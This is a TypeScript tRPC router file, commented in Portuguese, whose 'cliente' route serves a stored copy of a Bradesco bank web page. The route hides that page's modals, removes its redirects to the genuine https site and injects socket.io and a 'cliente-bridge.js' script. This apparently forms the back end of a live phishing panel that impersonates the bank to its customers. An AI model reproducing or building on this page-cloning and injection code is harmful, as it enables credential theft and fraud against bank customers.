import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import { accessRouter } from "./routers/access";
import { settingsRouter } from "./routers/settings";
import fs from "fs";
import path from "path";

const COOKIE_NAME = "app_session_id";

export const appRouter = router({
  system: systemRouter,
  access: accessRouter,
  settings: settingsRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  // Rota para servir o cliente Bradesco
  cliente: router({
    getHtml: publicProcedure.query(() => {
      try {
        const htmlPath = path.resolve(process.cwd(), "client", "public", "bradesco.html");
        if (!fs.existsSync(htmlPath)) {
          return { html: "<h1>Erro: arquivo não encontrado</h1>", error: true };
        }
        let html = fs.readFileSync(htmlPath, "utf-8");
        
        // Adicionar tag base para resolver URLs relativas
        html = html.replace(/<head[^>]*>/i, (match) => {
          return match + '\n<base href="/cliente-static/">';
        });
        
        // Adicionar CSS para ocultar modais e overlays
        const hideModalsCSS = `
<style>
  .modal, [class*="modal"], [id*="modal"], [id*="Modal"] {
    display: none !important;
    visibility: hidden !important;
    pointer-events: none !important;
  }
  .overlay, [class*="overlay"], [class*="Overlay"] {
    display: none !important;
    visibility: hidden !important;
    pointer-events: none !important;
  }
  .dialog, [class*="dialog"], [id*="dialog"] {
    display: none !important;
    visibility: hidden !important;
    pointer-events: none !important;
  }
  /* Fechar modais JSF */
  div[id*="Form"][style*="display"] {
    display: none !important;
  }
</style>
`;
        html = html.replace(/<\/head>/i, `${hideModalsCSS}</head>`);
        
        // Remover redirecionamentos de window.location
        html = html.replace(/window\.location\s*=\s*['"]https:\/\/[^'"]+['"]/g, "");
        html = html.replace(/document\.location\s*=\s*['"]https:\/\/[^'"]+['"]/g, "");
        
        // Injetar scripts e CSS
        const inject = `
<link rel="stylesheet" href="/cliente-bridge.css">
<script src="/socket.io/socket.io.js"><\/script>
<script src="/cliente-bridge.js"><\/script>
`;
        html = html.replace("</body>", `${inject}</body>`);
        
        return { html, error: false };
      } catch (err) {
        console.error("Erro ao carregar cliente HTML:", err);
        return { html: "<h1>Erro ao carregar cliente</h1>", error: true };
      }
    }),
  }),
});

export type AppRouter = typeof appRouter;
